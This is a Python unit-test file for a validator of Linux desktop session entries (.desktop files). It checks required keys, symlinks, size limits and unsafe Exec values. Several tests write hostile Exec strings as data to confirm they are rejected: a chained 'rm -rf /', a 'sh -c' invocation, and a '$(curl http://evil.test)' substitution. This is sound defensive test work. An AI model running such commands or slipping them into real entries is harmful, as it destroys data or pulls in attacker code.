"""Offline unit tests for user-level session entry metadata validation.

No login manager, display manager, compositor, Qt application or real Linux
Mint session is started here. Only local temporary files are inspected.
"""
import os
from pathlib import Path
import subprocess
import sys
import tempfile
import unittest

from canopy_features.installer.session_entry_validation import (
    MAX_ENTRY_BYTES,
    SessionEntryError,
    scan_session_entries,
    validate_session_entry,
)

ROOT = Path(__file__).resolve().parents[1]
MODULE = "canopy_features.installer.session_entry_validation"


class SessionEntryValidationTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.dir = Path(self.temp.name)
        self.binary = self.dir / "canopy-session"
        self.binary.write_bytes(b"#!/bin/sh\nexit 0\n")
        self.binary.chmod(0o700)
        self.entry = self.dir / "canopy-classic.desktop"
        self.write_entry(self.valid_text())

    def valid_text(self):
        return (
            "[Desktop Entry]\n"
            "Type=Application\n"
            "Name=Canopy Classic\n"
            "Comment=Canopy Classic session\n"
            f"Exec={self.binary}\n"
            "Icon=canopy-classic\n"
        )

    def write_entry(self, text):
        self.entry.write_text(text, encoding="utf-8")
        return self.entry

    def replace_exec(self, value):
        return self.valid_text().replace(
            f"Exec={self.binary}", f"Exec={value}"
        )

    def reject(self, text, pattern):
        self.write_entry(text)
        with self.assertRaisesRegex(SessionEntryError, pattern):
            validate_session_entry(self.entry)

    def test_valid_session_entry_accepted(self):
        result = validate_session_entry(self.entry)
        self.assertEqual(result.name, "Canopy Classic")
        self.assertEqual(result.comment, "Canopy Classic session")
        self.assertEqual(result.icon, "canopy-classic")
        self.assertEqual(result.exec_path, self.binary)

    @unittest.skipIf(os.name == "nt", "POSIX script execution")
    def test_binary_is_never_executed(self):
        marker = self.dir / "EXECUTED"
        self.binary.write_text(f"#!/bin/sh\ntouch {marker}\n", encoding="utf-8")
        self.binary.chmod(0o700)
        validate_session_entry(self.entry)
        self.assertFalse(marker.exists())

    def test_unsafe_exec_shell_chain_rejected(self):
        self.reject(
            self.replace_exec(f"{self.binary}; rm -rf /"),
            "shell-unsafe",
        )

    def test_unsafe_exec_shell_invocation_rejected(self):
        self.reject(self.replace_exec("/bin/sh -c payload"), "shell-unsafe")

    def test_unsafe_exec_field_code_rejected(self):
        self.reject(self.replace_exec(f"{self.binary} %f"), "shell-unsafe")

    def test_unsafe_exec_substitution_rejected(self):
        self.reject(self.replace_exec("$(curl http://evil.test)"), "shell-unsafe")

    def test_relative_exec_rejected(self):
        self.reject(self.replace_exec("canopy-session"), "absolute path")

    def test_exec_parent_traversal_rejected(self):
        self.reject(
            self.replace_exec(f"{self.dir}/../canopy-session"),
            "cannot contain '\\.\\.'",
        )

    def test_missing_session_binary_rejected(self):
        self.reject(
            self.replace_exec(self.dir / "absent-session"),
            "session binary is missing",
        )

    @unittest.skipIf(os.name == "nt", "POSIX executable-bit semantics")
    def test_non_executable_binary_rejected(self):
        self.binary.chmod(0o644)
        with self.assertRaisesRegex(SessionEntryError, "not executable"):
            validate_session_entry(self.entry)

    def test_symlinked_entry_rejected(self):
        link = self.dir / "link.desktop"
        try:
            link.symlink_to(self.entry)
        except (OSError, NotImplementedError):
            self.skipTest("symlink creation unavailable on this host")
        with self.assertRaisesRegex(SessionEntryError, "regular local file"):
            validate_session_entry(link)

    def test_symlinked_binary_rejected(self):
        real = self.dir / "real-session"
        real.write_bytes(b"#!/bin/sh\n")
        real.chmod(0o700)
        try:
            self.binary.unlink()
            self.binary.symlink_to(real)
        except (OSError, NotImplementedError):
            self.skipTest("symlink creation unavailable on this host")
        with self.assertRaisesRegex(SessionEntryError, "cannot be a symlink"):
            validate_session_entry(self.entry)

    def test_symlinked_exec_parent_directory_rejected(self):
        # A non-symlink binary reached through a symlinked parent directory can
        # resolve outside the user's tree; it must fail closed like a linked
        # binary, otherwise an entry can name an arbitrary system executable.
        real_dir = self.dir / "real-bin"
        real_dir.mkdir()
        binary = real_dir / "canopy-session"
        binary.write_bytes(b"#!/bin/sh\nexit 0\n")
        binary.chmod(0o700)
        link = self.dir / "linked-bin"
        try:
            link.symlink_to(real_dir, target_is_directory=True)
        except (OSError, NotImplementedError):
            self.skipTest("symlink creation unavailable on this host")
        self.write_entry(self.replace_exec(link / "canopy-session"))
        with self.assertRaisesRegex(SessionEntryError, "symlink"):
            validate_session_entry(self.entry)

    def test_unknown_key_rejected(self):
        self.reject(
            self.valid_text() + "X-GNOME-Autostart=true\n",
            "unsupported key",
        )

    def test_duplicate_key_rejected(self):
        self.reject(
            self.valid_text() + "Name=Other\n",
            "duplicate key",
        )

    def test_missing_required_key_rejected(self):
        text = self.valid_text().replace("Name=Canopy Classic\n", "")
        self.reject(text, "missing required key")

    def test_wrong_type_rejected(self):
        self.reject(
            self.valid_text().replace("Type=Application", "Type=Compositor"),
            "unsupported session entry Type",
        )

    def test_control_char_in_name_rejected(self):
        self.reject(
            self.valid_text().replace("Name=Canopy Classic",
                                      "Name=Canopy\x01Classic"),
            "clean string",
        )

    def test_oversize_entry_rejected(self):
        self.entry.write_bytes(b" " * (MAX_ENTRY_BYTES + 1))
        with self.assertRaisesRegex(SessionEntryError, "exceeds 16 KiB"):
            validate_session_entry(self.entry)

    def test_comments_and_blank_lines_ignored(self):
        text = "# a comment\n\n" + self.valid_text() + "\n# trailing\n"
        self.write_entry(text)
        self.assertEqual(validate_session_entry(self.entry).name, "Canopy Classic")

    def test_unsupported_group_rejected(self):
        self.reject(
            self.valid_text() + "[Desktop Action Extra]\nExec=x\n",
            "unsupported group",
        )

    def test_scan_reports_problems_and_keeps_valid_entries(self):
        bad = self.dir / "broken.desktop"
        bad.write_text(self.replace_exec(self.dir / "absent-session"),
                       encoding="utf-8")
        scan = scan_session_entries(self.dir)
        self.assertEqual(scan.checked_files, 2)
        self.assertEqual(len(scan.entries), 1)
        self.assertEqual(scan.entries[0].name, "Canopy Classic")
        self.assertEqual(len(scan.problems), 1)
        self.assertEqual(scan.problems[0].location, "broken.desktop")
        self.assertIn("missing", scan.problems[0].reason)

    def test_scan_bounds_file_count(self):
        for index in range(33):
            (self.dir / f"extra-{index:02d}.desktop").write_text(
                self.valid_text(), encoding="utf-8"
            )
        with self.assertRaisesRegex(SessionEntryError, "exceeds 32 files"):
            scan_session_entries(self.dir)

    def test_cli_pass_and_fail(self):
        good = subprocess.run(
            [sys.executable, "-m", MODULE, str(self.entry)],
            cwd=str(ROOT), capture_output=True, text=True, check=False,
        )
        self.assertEqual(good.returncode, 0, good.stderr)
        self.assertIn("SESSION_ENTRY_PASS", good.stdout)
        bad_entry = self.write_entry(
            self.replace_exec(self.dir / "absent-session")
        )
        bad = subprocess.run(
            [sys.executable, "-m", MODULE, str(bad_entry)],
            cwd=str(ROOT), capture_output=True, text=True, check=False,
        )
        self.assertEqual(bad.returncode, 1)
        self.assertIn("SESSION_ENTRY_FAIL", bad.stderr)


if __name__ == "__main__":
    unittest.main()
